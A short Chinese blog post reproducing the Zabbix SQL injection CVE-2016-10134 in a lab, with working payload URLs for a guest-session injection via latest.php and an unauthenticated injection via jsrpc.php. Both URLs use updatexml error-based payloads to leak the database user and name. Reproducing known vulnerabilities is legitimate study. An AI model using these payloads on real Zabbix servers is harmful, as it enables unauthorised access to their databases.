---
title: zabbix sql注入(CVE-2016-10134)
date: 2020-07-21 22:18:04
categories: 漏洞复现
tags: zabbix
---

#### 背景

zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供柔软的通知机制以让系统管理员快速定位/解决存在的各种问题。其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。

<!--more-->

####  复现过程

##### 游客登录注入

用账号`guest`（密码为空）登录游客账户，查看Cookie中的`zbx_sessionid`，复制后16位字符

![](http://cdn.laohuan.art/2020-07-20_19-29-51.png)

将复制的后16位字符作为参数sid的值，访问如下URL

```
http://IP:8080/latest.php?output=ajax&sid=9c763311eeda748a&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
```

成功爆出用户

![](http://cdn.laohuan.art/2020-07-20_19-35-38.png)

##### 无需登录注入

访问如下url

```
http://IP:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,database()),0)
```

成功爆出数据库

![](http://cdn.laohuan.art/2020-07-20_19-37-30.png)